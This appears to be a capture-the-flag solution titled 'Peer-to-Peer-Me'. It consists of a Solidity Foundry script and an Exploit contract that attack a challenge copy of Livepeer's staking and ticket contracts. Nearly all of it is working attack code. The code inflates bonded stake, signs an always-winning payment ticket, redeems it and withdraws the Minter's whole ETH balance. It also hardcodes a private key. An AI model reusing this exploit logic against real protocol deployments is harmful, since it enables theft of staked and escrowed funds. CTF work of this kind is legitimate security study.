# Peer-to-Peer-Me

- https://github.com/livepeer/protocol/blob/90d539259e95e5c8ee8c4047b73311527640b74f/src/test/BondingManagerInflatedTicketPoc.sol


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Challenge.sol";

struct Ticket {
    address recipient; // Address of ticket recipient
    address sender; // Address of ticket sender
    uint256 faceValue; // Face value of ticket paid to recipient if ticket wins
    uint256 winProb; // Probability ticket will win represented as winProb / (2^256 - 1)
    uint256 senderNonce; // Sender's monotonically increasing counter for each ticket
    bytes32 recipientRandHash; // keccak256 hash commitment to recipient's random value
    bytes auxData; // Auxilary data included in ticket used for additional validation
}

interface BondingManager {
    function bond(uint256, address) external;
    function unbond(uint256) external;
    function transcoder(uint256, uint256) external;
    function reward() external;
    function claimEarnings(uint256) external;
    function withdrawFees(address, uint256) external;
}

interface TicketBroker {
    function redeemWinningTicket(Ticket memory, bytes memory, uint256) external;
    function fundDeposit() external payable;
}

interface RoundsManager {
    function currentRound() external returns (uint256);
    function currentRoundStartBlock() external returns (uint256);
    function roundLength() external returns (uint256);
    function initializeRound() external;
    function blockHashForRound(uint256 _round) external returns (bytes32);
}


contract CounterScript is Script {
    ILPT public constant TOKEN = ILPT(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager public constant BONDING_MANAGER = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker public constant TICKET_BROKER = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager public constant ROUNDS_MANAGER = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address public constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    Challenge public chall;
    uint256 public PVKEY = 0x24ac60a62724ccbdacbf429820af599f235f8a5290f9b71aef83306998dcc268;

    address player;

    uint256 public constant TICKET_SENDER_KEY = 31337;

    address ticketSender;

    Exploit public ex;

    function setUp() public {
        chall = Challenge(address(0x897F9D3C40147fE1bC10d9cA66c4a724904852ec));
        ticketSender = vm.addr(TICKET_SENDER_KEY);

        ex = Exploit(payable(0xc29Af64a86388EE147FFFEF886cF37665d08eA9A));
    }

    function run() public {
        // console.log(block.number);
        // vm.startBroadcast(PVKEY);
        // ex = new Exploit();
        // payable(ticketSender).transfer(0.5 ether);
        // vm.stopBroadcast();

        // vm.startBroadcast(TICKET_SENDER_KEY);
        // TOKEN.approve(address(BONDING_MANAGER), type(uint256).max);
        // TICKET_BROKER.fundDeposit{ value: 0.4 ether }();
        // vm.stopBroadcast();

        // vm.startBroadcast(PVKEY);
        // ex.step1();
        // // nextRound()
        // for(uint i; i < 3; i++){
        //     payable(address(31337)).transfer(1);
        // }
        // vm.stopBroadcast();

        // console.log(address(ex));

        // vm.startBroadcast(PVKEY);
        // ex.step2();
        // vm.stopBroadcast();
        
        // vm.startBroadcast(TICKET_SENDER_KEY);
        // BONDING_MANAGER.bond(10 ether, ticketSender);
        // vm.stopBroadcast();

        // vm.startBroadcast(PVKEY);
        // ex.step3();
        // // nextRound();
        // vm.stopBroadcast();

        // vm.startBroadcast(PVKEY);
        // // for(uint i; i < 7; i++){
        // //     payable(address(31337)).transfer(1);
        // // }
        // ex.step4();
        // vm.stopBroadcast();

        vm.startBroadcast(PVKEY);
        (Ticket memory ticket, bytes memory sig, uint256 rand) = signWinningTicket();
        ex.step5(ticket, sig, rand);
        vm.stopBroadcast();

        console.log(MINTER.balance);
    }

    function nextRound() public {
        console.log("Current round (before roll): ", ROUNDS_MANAGER.currentRound());

        uint256 currentRoundStartBlock = ROUNDS_MANAGER.currentRoundStartBlock();
        uint256 roundLength = ROUNDS_MANAGER.roundLength();
        vm.roll(currentRoundStartBlock + roundLength);

        ROUNDS_MANAGER.initializeRound();

        console.log("Current round (after roll): ", ROUNDS_MANAGER.currentRound());
    }

    function signWinningTicket()
        public
        returns (
            Ticket memory ticket,
            bytes memory sig,
            uint256 rand
        )
    {
        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
        ticket = Ticket({
            recipient: address(ex),
            sender: ticketSender,
            faceValue: 1 ether,
            winProb: type(uint256).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint256(1337))),
            auxData: abi.encodePacked(
                ROUNDS_MANAGER.currentRound(),
                ROUNDS_MANAGER.blockHashForRound(ROUNDS_MANAGER.currentRound())
            )
        });

        // Sign it
        bytes32 ticketHash = keccak256(
            abi.encodePacked(
                ticket.recipient,
                ticket.sender,
                ticket.faceValue,
                ticket.winProb,
                ticket.senderNonce,
                ticket.recipientRandHash,
                ticket.auxData
            )
        );
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TICKET_SENDER_KEY, signHash);

        return (ticket, abi.encodePacked(r, s, v), 1337);
    }
    
    receive() external payable {

    }
}

contract Exploit {
    ILPT public constant TOKEN = ILPT(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager public constant BONDING_MANAGER = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker public constant TICKET_BROKER = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager public constant ROUNDS_MANAGER = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address public constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    Challenge public chall;
    address player;

    uint256 public constant TICKET_SENDER_KEY = 31337;

    address ticketSender = 0x4A130A95fB6EAdDFBaBB718D263cA0E4732d491E;

    constructor() {
        chall = Challenge(address(0x897F9D3C40147fE1bC10d9cA66c4a724904852ec));
        chall.claimLPT();
        // which in turn funds the second contract with 10 LPT
        TOKEN.transfer(ticketSender, 10 ether);
        TOKEN.approve(address(BONDING_MANAGER), type(uint256).max);
    }

    function step1() external {
        ROUNDS_MANAGER.initializeRound();
        BONDING_MANAGER.bond(4000 ether, address(this));
        BONDING_MANAGER.transcoder(1e6, 1e6);
    }

    function step2() external {
        ROUNDS_MANAGER.initializeRound();
        BONDING_MANAGER.unbond(4000 ether - 1 wei);
    }

    function step3() external {
        BONDING_MANAGER.reward();
    }

    function step4() external {
        ROUNDS_MANAGER.initializeRound();
    }

    function step5(Ticket memory ticket, bytes memory signature, uint256 rand) external {
        TICKET_BROKER.redeemWinningTicket(ticket, signature, rand);
        BONDING_MANAGER.claimEarnings(0);
        BONDING_MANAGER.withdrawFees(payable(address(this)), MINTER.balance);
    }

    receive() external payable {

    }
}
```
